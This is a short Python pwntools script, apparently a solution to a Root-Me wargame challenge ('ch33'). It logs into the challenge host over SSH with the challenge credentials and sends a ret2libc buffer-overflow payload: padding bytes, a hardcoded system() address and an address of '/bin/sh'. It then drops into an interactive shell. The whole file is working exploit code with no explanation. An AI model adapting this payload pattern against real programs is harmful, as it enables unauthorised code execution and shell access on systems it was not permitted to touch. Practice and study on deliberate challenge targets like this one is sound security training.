from pwn import *


shell = ssh(host='challenge02.root-me.org',
		user='app-systeme-ch33',
		password='app-systeme-ch33',
		port=2222)

payload = b''
system_adress = p32(0xb7e67310)
sh_address = p32(0xb7f89d4c)

payload += b'a'*32
payload += system_adress
payload += b'a'*4
payload += sh_address

p = shell.process(['./ch33', payload])
p.interactive()